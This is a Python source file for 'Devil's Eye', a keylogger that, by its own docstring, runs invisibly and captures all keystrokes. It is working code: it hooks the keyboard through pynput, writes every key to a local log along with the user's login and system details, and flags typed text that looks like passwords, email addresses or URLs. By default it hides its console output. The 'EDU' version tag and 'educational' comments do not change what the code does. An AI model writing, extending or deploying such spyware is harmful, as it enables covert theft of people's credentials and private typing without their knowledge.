"""
DEVIL'S EYE CORE
Background keylogger component
Runs invisibly, captures all keystrokes
"""

import sys
import os
import time
import json
from datetime import datetime
from pynput import keyboard
import platform
import signal

# ===== CONFIGURATION =====
APP_NAME = "Devil's Eye"
VERSION = "1.0-EDU"
LOG_DIR = "devils_eye_logs"
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")
STATUS_FILE = os.path.join(LOG_DIR, "status.json")
PID_FILE = os.path.join(LOG_DIR, "devils_eye.pid")

# ===== INITIALIZATION =====
def setup_environment():
    """Create necessary directories and files"""
    os.makedirs(LOG_DIR, exist_ok=True)
    
    # Write PID for stopping mechanism
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))
    
    # Initialize status file
    status = {
        "app_name": APP_NAME,
        "version": VERSION,
        "start_time": get_timestamp(),
        "system": f"{platform.system()} {platform.release()}",
        "user": os.getlogin(),
        "status": "running",
        "keys_captured": 0,
        "last_activity": None
    }
    
    with open(STATUS_FILE, "w") as f:
        json.dump(status, f, indent=2)
    
    # Log startup
    log_event("SYSTEM", f"{APP_NAME} v{VERSION} initialized")
    log_event("SYSTEM", f"User: {os.getlogin()}")
    log_event("SYSTEM", f"System: {platform.system()} {platform.release()}")
    log_event("SYSTEM", "="*50)

# ===== LOGGING FUNCTIONS =====
def get_timestamp():
    """Get precise timestamp"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

def log_event(event_type, value):
    """Log an event to the keystroke log"""
    timestamp = get_timestamp()
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] [{event_type}] {value}\n")
    
    # Update status
    update_status()

def update_status():
    """Update the status JSON file"""
    try:
        with open(STATUS_FILE, "r") as f:
            status = json.load(f)
        
        # Count lines in log file
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                status["keys_captured"] = len(f.readlines())
        
        status["last_activity"] = get_timestamp()
        
        with open(STATUS_FILE, "w") as f:
            json.dump(status, f, indent=2)
    except:
        pass

# ===== KEYBOARD HANDLERS =====
class KeyLogger:
    def __init__(self):
        self.current_window = None
        self.buffer = ""  # For capturing words/phrases
        self.special_keys = {
            keyboard.Key.space: "SPACE",
            keyboard.Key.enter: "ENTER",
            keyboard.Key.tab: "TAB",
            keyboard.Key.backspace: "BACKSPACE",
            keyboard.Key.esc: "ESC",
            keyboard.Key.shift: "SHIFT",
            keyboard.Key.ctrl_l: "CTRL",
            keyboard.Key.ctrl_r: "CTRL_R",
            keyboard.Key.alt_l: "ALT",
            keyboard.Key.alt_r: "ALT_R",
            keyboard.Key.cmd: "CMD" if platform.system() == "Darwin" else "WIN"
        }
    
    def on_press(self, key):
        """Handle key press events"""
        try:
            # Regular character key
            if hasattr(key, 'char') and key.char:
                char = key.char
                
                # Log the character
                log_event("KEY", f"'{char}'")
                
                # Buffer for word capture (educational feature)
                self.buffer += char
                if len(self.buffer) > 50:  # Flush buffer if too long
                    self.analyze_buffer()
                    
            else:
                # Special key
                key_name = self.special_keys.get(key, str(key).replace("Key.", ""))
                log_event("SPECIAL", key_name)
                
                # Buffer analysis on space, enter, etc.
                if key in [keyboard.Key.space, keyboard.Key.enter]:
                    self.analyze_buffer()
                
                # Clear buffer on backspace
                if key == keyboard.Key.backspace and self.buffer:
                    self.buffer = self.buffer[:-1]
                    
        except Exception as e:
            log_event("ERROR", f"Key processing: {str(e)}")
    
    def on_release(self, key):
        """Handle key release events"""
        # ESC key stops the logger (for testing)
        if key == keyboard.Key.esc:
            log_event("SYSTEM", "Stopped by ESC key (testing mode)")
            return False
    
    def analyze_buffer(self):
        """Analyze buffered text for educational insights"""
        if len(self.buffer) >= 3:  # Only analyze meaningful text
            # Simple analysis examples:
            buffer_lower = self.buffer.lower()
            
            # Check for potential passwords (educational)
            if any(word in buffer_lower for word in ["pass", "pwd", "login"]):
                log_event("ANALYSIS", f"Possible credential input detected: {self.buffer}")
            
            # Check for potential emails
            if "@" in self.buffer and "." in self.buffer:
                log_event("ANALYSIS", f"Possible email address: {self.buffer}")
            
            # Check for URLs
            if any(proto in buffer_lower for proto in ["http://", "https://", "www."]):
                log_event("ANALYSIS", f"Possible URL: {self.buffer}")
        
        # Clear buffer after analysis
        self.buffer = ""

# ===== SIGNAL HANDLERS =====
def signal_handler(sig, frame):
    """Handle termination signals"""
    log_event("SYSTEM", f"Received signal {sig}, shutting down gracefully")
    
    # Update status
    try:
        with open(STATUS_FILE, "r") as f:
            status = json.load(f)
        status["status"] = "stopped"
        status["stop_time"] = get_timestamp()
        with open(STATUS_FILE, "w") as f:
            json.dump(status, f, indent=2)
    except:
        pass
    
    # Remove PID file
    try:
        os.remove(PID_FILE)
    except:
        pass
    
    log_event("SYSTEM", f"{APP_NAME} stopped")
    log_event("SYSTEM", "="*50)
    
    sys.exit(0)

# ===== MAIN EXECUTION =====
def main():
    """Main execution loop"""
    # Setup environment
    setup_environment()
    
    # Register signal handlers
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Initialize keylogger
    keylogger = KeyLogger()
    
    # Start listening
    log_event("SYSTEM", "Keyboard listener started")
    
    with keyboard.Listener(
        on_press=keylogger.on_press,
        on_release=keylogger.on_release
    ) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            log_event("SYSTEM", "Keyboard interrupt received")
        except Exception as e:
            log_event("ERROR", f"Listener crashed: {str(e)}")
    
    # Cleanup
    signal_handler(signal.SIGTERM, None)

if __name__ == "__main__":
    # Determine if running in foreground or background
    if len(sys.argv) > 1 and sys.argv[1] == "--debug":
        print(f"[DEBUG] {APP_NAME} v{VERSION}")
        print(f"[DEBUG] Log directory: {LOG_DIR}")
        print(f"[DEBUG] PID: {os.getpid()}")
        print("[DEBUG] Press Ctrl+C to stop")
        main()
    else:
        # Background mode - suppress output
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        main()